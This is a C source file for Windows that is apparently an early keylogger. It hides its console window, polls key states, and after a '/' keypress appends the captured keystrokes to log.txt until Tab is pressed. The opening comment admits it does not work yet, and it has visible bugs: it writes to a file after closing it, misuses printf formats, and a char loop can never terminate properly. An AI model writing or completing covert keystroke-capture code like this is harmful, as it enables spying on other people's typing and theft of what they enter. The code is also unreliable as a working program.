// Obviously doesn't work, yet.

#include <windows.h>
#include <stdio.h>

int Save(int _key, char *file);
int SaveInt(int number, char *file);

int main(void)
{
    printf("%s\n", "Start of log");
    int back = 47;
    printf("%d", '/');
    printf("%s", &back);

    FreeConsole();

    char i;
    printf("%s\n", "INIT");
    while (1 == 1)
    {
        Sleep(10);
        for (i = 8; i < 255; i++){
            //printf("%d", i);
            // SaveInt(GetAsyncKeyState(i),"log.txt");
            if ((GetAsyncKeyState(i) == -32767) && (i == 47)){
                printf("%s activated with %d", "Chat", i);
                Save(i, "log.txt");
            }
        }
    }
    return 0;
}

int Save(int _key, char *file)
{
    printf("%d\n", _key);
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    int activeKey = 1;

    while (activeKey == 1)
    {
        Sleep(10);
        for (char i = 8; i < 255; i++)
        {
            printf("%d", i);
            // SaveInt(GetAsyncKeyState(i),"log.txt");
            if (i == VK_TAB)
            {
                activeKey = 0;
                break;
            }
            if ((GetAsyncKeyState(i) == -32767)){
            switch (i)
                {
                case VK_SHIFT:
                    fprintf(OUTPUT_FILE, "[SHIFT]");
                    break;
                case VK_BACK:
                    fprintf(OUTPUT_FILE, "[BACKSPACE]");
                    break;
                case VK_LBUTTON:
                    fprintf(OUTPUT_FILE, "[LBUTTON]");
                    break;
                case VK_RBUTTON:
                    fprintf(OUTPUT_FILE, "[RBUTTON]");
                    break;
                case VK_RETURN:
                    fprintf(OUTPUT_FILE, "[ENTER]");
                    break;
                case VK_TAB:
                    fprintf(OUTPUT_FILE, "[TAB]");
                    break;
                case VK_ESCAPE:
                    fprintf(OUTPUT_FILE, "[ESCAPE]");
                    break;
                case VK_CONTROL:
                    fprintf(OUTPUT_FILE, "[Ctrl]");
                    break;
                case VK_MENU:
                    fprintf(OUTPUT_FILE, "[Alt]");
                    break;
                case VK_CAPITAL:
                    fprintf(OUTPUT_FILE, "[CAPS Lock]");
                    break;
                case VK_SPACE:
                    fprintf(OUTPUT_FILE, "[SPACE]");
                    break;
                case VK_OEM_2:
                    fprintf(OUTPUT_FILE, "[/]");
                    break;
                }
                fprintf(OUTPUT_FILE, "%s", &_key);
                fclose(OUTPUT_FILE);
            }
        }
    }
    return 0;
}

int SaveInt(int number, char *file)
{
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    fprintf(OUTPUT_FILE, "%d,\n", number);
    fclose(OUTPUT_FILE);
    return 0;
}

